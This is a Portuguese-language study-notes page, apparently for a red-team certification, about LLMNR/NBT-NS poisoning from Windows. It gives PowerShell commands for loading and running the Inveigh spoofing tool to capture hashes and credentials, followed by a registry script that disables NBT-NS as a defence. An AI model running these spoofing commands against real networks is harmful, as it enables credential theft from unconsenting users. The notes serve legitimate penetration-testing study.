> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/llmnr-nbt-ns-poisoning-from-windows.md).

# LLMNR/NBT-NS Poisoning - from Windows

#### Inveigh

O Inveigh conduz ataques de spoofing e capturas de hash/credenciais por meio de sniffing de pacotes e listeners/sockets específicos de protocolo.

* Usando o `Import-Module`cmd-let do PowerShell para importar a ferramenta baseada no Windows `Inveigh.ps1`.

```powershell
Import-Module .\Inveigh.ps1	
```

* Usado para gerar muitas das opções e funcionalidades disponíveis com `Invoke-Inveigh`. Executado a partir de um host baseado em Windows

```powershell
(Get-Command Invoke-Inveigh).Parameters	
```

* Inicia `Inveigh`em um host baseado em Windows com falsificação de LLMNR e NBNS habilitada e envia os resultados para um arquivo.

```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

* Inicia a `C#`implementação de `Inveigh`um host baseado em Windows.

```powershell
.\Inveigh.exe
```

* Script do PowerShell usado para desabilitar o NBT-NS em um host Windows.

```
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
